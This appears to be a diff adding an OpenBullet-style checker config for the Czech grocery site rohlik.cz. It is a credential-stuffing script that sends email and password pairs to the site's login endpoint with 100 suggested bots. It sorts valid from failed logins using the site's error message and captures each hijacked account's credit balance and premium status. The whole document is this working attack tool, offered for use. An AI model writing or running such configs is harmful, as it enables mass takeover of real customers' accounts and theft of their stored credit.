@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "rohlik.cz",
+  "SuggestedBots": 100,
+  "LastModified": "2019-06-05T13:34:08.3396524-07:00",
+  "AdditionalInfo": "Credits, premium capture",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "JarlosBenda",
+  "Version": "1.2.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.rohlik.cz/services/frontend-service/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.rohlik.cz" 
+  HEADER "referer: https://www.rohlik.cz/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":200,\"messages" 
+    KEY ",\"isAuthenticated\":true" 
+  KEYCHAIN Failure OR 
+    KEY "Zadal(a) jste nesprávný e-mail nebo heslo." 
+    KEY "{\"status\":401,\"messages\":[{\"content\":\"Zadal(a) jste nesprávný e-mail nebo heslo.\",\"" 
+
+PARSE "<SOURCE>" LR "\"credits\":" "," -> CAP "BALANCE" 
+
+PARSE "<SOURCE>" LR "\"premium\":" "," -> CAP "PREMIUM" 
+
